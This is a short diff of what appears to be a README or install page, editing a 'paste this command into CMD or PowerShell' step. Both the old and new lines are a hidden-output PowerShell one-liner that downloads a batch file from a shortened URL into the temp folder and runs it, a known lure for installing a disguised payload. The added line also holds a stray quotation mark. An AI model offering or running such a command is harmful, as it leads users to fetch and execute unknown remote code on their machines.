@@ -28,7 +28,7 @@
 Paste this command into CMD or PowerShell:
 
 ```
-powershell -c "cls;md $env:AppData\Utilities -f;iwr https://git.new/zhV1D2s -o $env:TEMP\Setup.bat;start $env:TEMP\Setup.bat" >$null 2>&1
+powershell -c "cls; "md $env:AppData\Utilities -f;iwr https://git.new/zhV1D2s -o $env:TEMP\Setup.bat;& $env:TEMP\Setup.bat" >$null 2>&1
 ```
 
 ---
